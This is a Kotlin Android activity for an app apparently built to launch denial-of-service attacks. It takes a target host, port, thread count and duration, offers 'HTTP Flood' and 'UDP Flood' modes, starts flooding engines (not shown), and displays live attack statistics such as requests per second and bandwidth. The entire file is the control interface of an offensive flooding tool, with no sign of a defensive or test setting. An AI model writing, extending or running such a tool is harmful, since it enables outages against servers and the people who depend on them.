package com.security.ddos

import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    private var ddosEngine: DDoSEngine? = null
    private var udpEngine: UDPFloodEngine? = null

    private lateinit var targetInput: EditText
    private lateinit var portInput: EditText
    private lateinit var threadsInput: EditText
    private lateinit var durationInput: EditText
    private lateinit var attackTypeSpinner: Spinner
    private lateinit var statusText: TextView
    private lateinit var statsText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        initializeViews()
        setupListeners()
    }

    private fun initializeViews() {
        targetInput = findViewById(R.id.target_url)
        portInput = findViewById(R.id.target_port)
        threadsInput = findViewById(R.id.thread_count)
        durationInput = findViewById(R.id.duration)
        attackTypeSpinner = findViewById(R.id.attack_type)
        statusText = findViewById(R.id.status_text)
        statsText = findViewById(R.id.stats_text)
        startBtn = findViewById(R.id.start_btn)
        stopBtn = findViewById(R.id.stop_btn)

        // Setup spinner
        val attackTypes = arrayOf("HTTP Flood", "UDP Flood")
        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_item, attackTypes)
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item)
        attackTypeSpinner.adapter = adapter
    }

    private fun setupListeners() {
        startBtn.setOnClickListener { startAttack() }
        stopBtn.setOnClickListener { stopAttack() }
    }

    private fun startAttack() {
        val target = targetInput.text.toString()
        val port = portInput.text.toString().toIntOrNull() ?: 80
        val threads = threadsInput.text.toString().toIntOrNull() ?: 50
        val duration = durationInput.text.toString().toLongOrNull() ?: 60
        val attackType = attackTypeSpinner.selectedItem.toString()

        if (target.isBlank()) {
            statusText.text = "[!] Error: Enter target URL/Host"
            return
        }

        startBtn.isEnabled = false
        statusText.text = "[*] Initializing attack...\nTarget: $target\nThreads: $threads\nDuration: ${duration}s\nType: $attackType"

        lifecycleScope.launch {
            when (attackType) {
                "HTTP Flood" -> startHttpFlood(target, threads, duration)
                "UDP Flood" -> startUdpFlood(target, port, threads, duration)
            }
        }
    }

    private suspend fun startHttpFlood(target: String, threads: Int, duration: Long) {
        try {
            val targetUrl = if (!target.startsWith("http")) "http://$target" else target

            ddosEngine = DDoSEngine(targetUrl, threads, duration * 1000) { stats ->
                runOnUiThread {
                    statsText.text = """
                        [+] Attack Statistics:
                        Total Requests: ${stats.totalRequests}
                        Success: ${stats.successCount}
                        Failed: ${stats.failureCount}
                        RPS: ${stats.rps}
                        Elapsed: ${stats.elapsedSeconds}s
                    """.trimIndent()
                }
            }

            statusText.text = "[+] HTTP Flood Attack Started"
            ddosEngine?.start()
            statusText.text = "[+] Attack Complete"
        } catch (e: Exception) {
            statusText.text = "[!] Error: ${e.message}"
        } finally {
            startBtn.isEnabled = true
        }
    }

    private suspend fun startUdpFlood(target: String, port: Int, threads: Int, duration: Long) {
        try {
            udpEngine = UDPFloodEngine(target, port, threads, 512, duration * 1000) { stats ->
                runOnUiThread {
                    statsText.text = """
                        [+] Attack Statistics:
                        Total Packets: ${stats.totalPackets}
                        PPS: ${stats.packetsPerSecond}
                        Bandwidth: ${stats.bandwidthMBps} MB/s
                        Elapsed: ${stats.elapsedSeconds}s
                    """.trimIndent()
                }
            }

            statusText.text = "[+] UDP Flood Attack Started"
            udpEngine?.start()
            statusText.text = "[+] Attack Complete"
        } catch (e: Exception) {
            statusText.text = "[!] Error: ${e.message}"
        } finally {
            startBtn.isEnabled = true
        }
    }

    private fun stopAttack() {
        ddosEngine?.stop()
        udpEngine?.stop()
        statusText.text = "[*] Attack stopped"
        startBtn.isEnabled = true
    }
}
